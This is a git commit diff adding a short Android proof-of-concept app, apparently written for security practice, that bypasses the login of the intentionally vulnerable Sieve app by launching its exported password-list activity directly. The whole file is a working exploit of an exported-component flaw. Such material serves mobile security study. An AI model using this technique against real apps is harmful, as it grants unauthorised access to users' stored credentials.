859837dc6871f5268cf5446cf3ddf618aee2026b
Ahmed Sufyan <sufyandaredevil@gmail.com>
2024-03-31 22:24:10 +0530

    added pocs folder

---
+++ pocs/SieveLoginBypass/app/src/main/java/com/hacking/sieveloginbypass/MainActivity.java
@@ -0,0 +1,24 @@
+package com.hacking.sieveloginbypass;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.ComponentName;
+import android.content.Intent;
+import android.os.Bundle;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        // code - to start the following Activity
+        // com.mwr.example.sieve / .PWList
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.mwr.example.sieve","com.mwr.example.sieve.PWList"));
+        startActivity(intent);
+
+
+    }
+}
